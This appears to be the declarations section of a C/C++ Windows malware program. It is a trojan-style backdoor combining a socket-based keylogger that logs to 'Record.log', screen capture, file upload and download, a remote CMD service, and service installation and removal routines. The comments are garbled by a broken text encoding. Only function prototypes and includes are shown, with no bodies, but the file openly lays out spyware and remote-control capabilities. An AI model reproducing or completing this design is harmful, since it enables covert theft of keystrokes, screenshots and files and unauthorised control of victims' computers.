//service
#include<stdio.h> 
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//keylog
#include <windows.h>
#include <time.h>
#include <iostream> 
#include <string>
#include <fstream>
#define FILE_NAME "Record.log"
#define MIN_RECORD_SIZE 25
#include <conio.h>

//file
#include <stdlib.h> 
#include <string.h> 

//PtrSc
#include <math.h>
#include <wingdi.h>

//PtrSc
void echo(CHAR *str);
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);//��ͼ����
void Capture(int num); //��ͼ���溯�� 
void PtrSc(int num); //���ý�ͼ����

void logKey(SOCKET Socket);  //��¼���� 
char* decode(int); // ���ܼ��� 
char* decodeCaps(int); //��д���� 
void logUserTime();  //ʱ��� 
bool checkRecordSize();  //�����ļ������� 
int KeyLog(SOCKET Socket); //���̼�¼���� 

void sendFile(SOCKET m_New_Socket); //�����ļ� 
void recvFile(SOCKET m_New_Socket);  //�����ļ�
void BackDoor();//�����ļ������� 

void DelServices();  //ɾ�������� 
int door();    //���ź��� 
void Usage(void);  //��ʾ��Ϣ 
void WINAPI EXEBackMain(LPVOID s);   //CMD���� 
void WINAPI ServiceCtrlHandler(DWORD Opcode);   //������ƺ��� 
BOOL InstallCmdService();  //��װ������ 
void WINAPI ServiceMain(DWORD, LPTSTR *);   //���������� 
DWORD WINAPI CmdService(LPVOID);  //CMD 
